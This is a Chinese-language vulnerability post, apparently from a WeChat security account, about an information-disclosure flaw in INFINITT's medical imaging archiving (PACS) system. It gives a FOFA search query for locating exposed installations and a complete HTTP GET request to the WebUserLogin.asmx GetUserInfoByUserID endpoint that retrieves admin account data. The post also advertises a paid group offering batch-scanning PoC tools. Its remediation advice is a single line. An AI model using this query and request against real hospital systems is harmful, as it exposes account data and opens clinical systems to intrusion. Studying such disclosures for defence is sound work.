#  英飞达医学影像存档与通信系统WebUserLogin.asmx接口存在信息泄露漏洞 附POC   
2024-11-4更新  南风漏洞复现文库   2024-11-04 21:40  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 英飞达医学影像存档与通信系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
英飞达医学影像存档与通信系统  
## 2.漏洞描述  
  
英飞达医学影像存档与通信系统主要用于医疗图像的采集、存储、浏览、传输和输出。英飞达医学影像存档与通信系统WebUserLogin.asmx接口存在信息泄露漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
英飞达医学影像存档与通信系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1icmNt1SXYZ7hq06AibfnE5Wic30uXdZYib9yLxKN1Y1u5xcW9xtVq4Rabg/640?wx_fmt=png&from=appmsg "null")  
  
英飞达医学影像存档与通信系统WebUserLogin.asmx接口存在信息泄露漏洞  
## 4.fofa查询语句  
  
"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xxx/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin  
  
漏洞数据包：  
```
GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1VSBpp9JHicSKBhvmiaJpUMFicRJibC14SSgOvTBZKrNBiatzX1QUqO0ryvg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1Kse8ZAxYrXWsgZa6MGB5PzdeXIwE8iaRwVMZeasHfvic1E3nFuVb66Qw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1XZGOYdyordbHaWAnMKoU6Gxg2lpJRMWcJTyx85L7mrSE4VEqk9dBVw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1wctfJsy8swpIzlPbPkkTv213ZzGRVvQScJgDyhpZoOe1FgtefjpJcA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1Q2Szj2Ip4ib6LtD0yIOyoPcND2NxvXFbboLrqkDTz6Wxy6bNhFiaH9Kw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq17M4GRDmdL8qFPmJbKG8dHd6JLvUhjUic2khibrylu3C6IbH5Wfrf0aVQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系厂商打补丁 https://www.infinitt.vip/icnweb/  
## 8.往期回顾  
  
  
[时空智友企业流程化管控系统uploadStudioFile接口存在任意文件上传漏洞 -老漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487647&idx=1&sn=c097b974aed0d81ebbb39b47e560e070&chksm=974b9d98a03c148e0c94260ab1a5e8f42572e12732a672977163b3405be49177f5cff0f22fec&scene=21#wechat_redirect)  
  
  
[高校人力资源管理服务平台系统ReportServer接口存在敏感信息泄露漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487647&idx=2&sn=0a6daa07bc040bc9d6b31d2179c49de8&chksm=974b9d98a03c148e02a119cf14d9129a48136eb90420b486e4c2d8512619bd248add52ba06d1&scene=21#wechat_redirect)  
  
  
